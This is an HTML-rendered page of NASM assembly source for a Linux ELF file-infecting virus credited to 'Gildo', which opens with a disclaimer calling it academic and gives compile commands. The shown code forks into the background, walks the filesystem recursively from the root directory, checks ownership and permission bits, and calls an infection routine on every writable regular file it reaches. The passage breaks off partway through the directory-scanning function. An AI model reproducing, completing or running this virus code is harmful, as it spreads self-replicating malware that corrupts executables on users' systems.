<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>gildo.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;(c)Gildo</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;this source is been written only for accademical purpouses,</span><span class="sc0">
</span><span class="sc1">;it's not intended for malicious purpouses else I'm not responsable</span><span class="sc0">
</span><span class="sc1">;of how you'll use it.</span><span class="sc0">

</span><span class="sc1">;compile with:</span><span class="sc0">
</span><span class="sc1">;nasm -f elf virus.asm -o virus.o &amp;&amp; ld -e main virus.o -o virus</span><span class="sc0">
</span><span class="sc1">;thanks to Silvio Cesare a lot, I think I'll love him</span><span class="sc0">
</span><span class="sc1">;thanks to my friends Perikles,uNdErX,d3lta,T00FiC,urgo32,...</span><span class="sc0">
</span><span class="sc1">;and every programmer not closed mind</span><span class="sc0">

</span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
</span><span class="sc9">%endif</span><span class="sc0">


</span><span class="sc9">section</span><span class="sc0"> </span><span class="sc10">.text</span><span class="sc0">

</span><span class="sc9">global</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0">


</span><span class="sc5">main</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">      </span><span class="sc1">;;;;;;;;pointer to func called at atexit()</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">            </span><span class="sc1">;[ebp]=old ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0"> 

    </span><span class="sc1">;here I fork so I go in background</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">   </span><span class="sc1">;SYS fork()  the background will do the infection</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">parent</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">   </span><span class="sc1">;getuid</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;[ebp-4]=uid</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">47</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">   </span><span class="sc1">;getgid</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;[ebp-8]=gid</span><span class="sc0">
    
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc0">           </span><span class="sc1">;[ebp-72]=struct stat</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x2f</span><span class="sc0"> </span><span class="sc1">;0x2f='/' &lt;-directory root to begin the scan</span><span class="sc0">
    </span><span class="sc1">;push dword '/aha'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc1">;writepermissions 4=readonly,2=write only</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">scan_dir</span><span class="sc0">   
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc0">  </span><span class="sc1">;restore stack</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">   </span><span class="sc1">;restore uid,gid</span><span class="sc0">

    </span><span class="sc1">;------the child finish</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">   </span><span class="sc1">;exit </span><span class="sc0">
    
   </span><span class="sc5">parent</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x0a297374</span><span class="sc0">  
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x6e656d6d</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x6f632072</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x6f662820</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x6d682e7a</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x7a614a40</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x6f646c69</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x47206c69</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x616d650a</span><span class="sc0"> 
    </span><span class="sc1">;0x8c from main:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x0a737572</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x6976206f</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x646c6947</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
   
   </span><span class="sc5">parent_process</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;the parent process jumps here</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">   </span><span class="sc1">;;;;;;;atexit()</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ahah</span><span class="sc0">  </span><span class="sc1">;here overwrite a jump tp old entry point</span><span class="sc0">
   </span><span class="sc5">ahah</span><span class="sc4">:</span><span class="sc0">    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">   </span><span class="sc1">;exit (here I will write a jmp to old entry point)</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">


</span><span class="sc5">scan_dir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;push ebp don't change ebp! else how can I access global members form </span><span class="sc0">
        </span><span class="sc1">; my recursive function?!? So I'll use esp as base pointer</span><span class="sc0">
    </span><span class="sc1">;mov ebp,esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;point to arg2: filename</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">; point to arg1: </span><span class="sc0">
    </span><span class="sc1">;writepermissions (&amp;2==2 if can write for parent directory permissions) </span><span class="sc0">

   </span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">;;debug esi(arg2)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string3a</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">    </span><span class="sc1">;;</span><span class="sc0">
   </span><span class="sc9">%endif</span><span class="sc0">
   
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">;;debug edi(arg1)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">     
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string10a</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">    </span><span class="sc1">;;</span><span class="sc0">
   </span><span class="sc9">%endif</span><span class="sc0">
   
    </span><span class="sc1">;-----------stack variables</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">;fd</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">;permissions 00-07</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">;file_type 010=regular file,04=directory </span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">128</span><span class="sc0">  </span><span class="sc1">;pathname ;;;TODO:::change to 4095 as linux/limits.h says</span><span class="sc0">

    </span><span class="sc1">;-----------stat</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">106</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">      </span><span class="sc1">;pointer to ascii filename</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">72</span><span class="sc0">   </span><span class="sc1">;ecx=pointer to struct stat</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
   </span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;;debug</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string6a</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">   
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">;;</span><span class="sc0">
   </span><span class="sc9">%endif</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">c_stat</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">error_stat</span><span class="sc0">
    </span><span class="sc5">c_stat</span><span class="sc4">:</span><span class="sc0">
    
    </span><span class="sc1">;----------verify permissions</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">72</span><span class="sc0">   </span><span class="sc1">;ebx=pointer to struct stat</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;st_mode (short)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc1">;look who owns the permissions</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;stat.st_uid </span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;process uid (short)</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">user_permissions</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;stat.st_gid</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;process gid (short)</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">group_permissions</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;process gid==0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">user_permissions</span><span class="sc0">
    </span><span class="sc5">others_permissions</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7q</span><span class="sc0"> </span><span class="sc1">;7q=mask for others   </span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">c_permissions</span><span class="sc0">   
    </span><span class="sc5">user_permissions</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">  </span><span class="sc1">;shift right of 6 bits</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7q</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">c_permissions</span><span class="sc0">
    </span><span class="sc5">group_permissions</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">  </span><span class="sc1">;shift right of 3 bits</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7q</span><span class="sc0">
    </span><span class="sc5">c_permissions</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">128</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">;store file permissions of the user</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">;;;debug permissions</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string5a</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">   </span><span class="sc1">;;</span><span class="sc0">
   </span><span class="sc9">%endif</span><span class="sc0">
    
    </span><span class="sc1">;--------verify file type</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">72</span><span class="sc0">   </span><span class="sc1">;ebx=pointer to struct stat</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;st_mode (short)</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">170000q</span><span class="sc0"> </span><span class="sc1">;bit-mask for file-type</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">128</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">;store the file-type</span><span class="sc0">
    
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">;;;debug file-type</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string7a</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">   </span><span class="sc1">;;</span><span class="sc0">
   </span><span class="sc9">%endif</span><span class="sc0">

    </span><span class="sc1">;decision: if is a regular file-&gt;if write perm.-&gt; infect it</span><span class="sc0">
    </span><span class="sc1">;      if is a directory-&gt;chdir(directory);scan_dir(*);</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">128</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4q</span><span class="sc0"> 
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">is_directory</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10q</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">is_regular_file</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">e_scan_dir</span><span class="sc0">

   </span><span class="sc5">is_regular_file</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;infect it, the file name is pointed by esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;;;debug writepermissions</span><span class="sc0">
   </span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string9a</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">   </span><span class="sc1">;;</span><span class="sc0">
   </span><span class="sc9">%endif</span><span class="sc0">

    </span><span class="sc1">;if I have write permission of my parent directory and </span><span class="sc0">
    </span><span class="sc1">;if the file permissions allow me to write then infect the file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;writepermissions (parentdir)</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2q</span><span class="sc0"> 
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2q</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">c1_is_regular_file</span><span class="sc0"> </span><span class="sc1">;if I have parent permissions</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">e_scan_dir</span><span class="sc0">
   </span><span class="sc5">c1_is_regular_file</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">128</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;look file permissions (of stat)</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2q</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2q</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">c2_is_regular_file</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">e_scan_dir</span><span class="sc0">
   </span><span class="sc5">c2_is_regular_file</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;now I can infect</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect_file</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">e_scan_dir</span><span class="sc0">
    
   </span><span class="sc5">is_directory</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;----------save the current working directory in the stack</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">183</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">  </span><span class="sc1">;pathname</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">128</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">     </span><span class="sc1">;SYS getcwd</span><span class="sc0">

   </span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;;debug getcwd status</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string12a</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">  </span><span class="sc1">;;</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">  </span><span class="sc1">;;debug current dir</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string11a</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;;;</span><span class="sc0">
   </span><span class="sc9">%endif</span><span class="sc0">
    
    </span><span class="sc1">;----------open file descriptor of the directory</span><span class="sc0">
